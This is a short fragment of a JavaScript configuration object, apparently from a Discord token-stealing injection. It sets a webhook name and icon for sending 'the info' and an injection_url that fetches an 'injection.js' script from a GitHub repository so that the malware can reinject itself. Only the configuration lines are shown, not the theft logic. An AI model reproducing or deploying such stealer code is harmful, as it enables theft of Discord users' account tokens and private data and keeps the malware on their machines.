...
const config = {
  ...
  embed_name: 'Decks Team', //name of the webhook thats gonna send the info
  embed_icon: 'https://cdn.discordapp.com/attachments/1045456439965126717/1046838773956223067/MOSHED-2022-9-24-18-22-261.gif'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/aniko33/Rdimo-Injection/main/injection.js', //injection url for when it reinjects
  /**
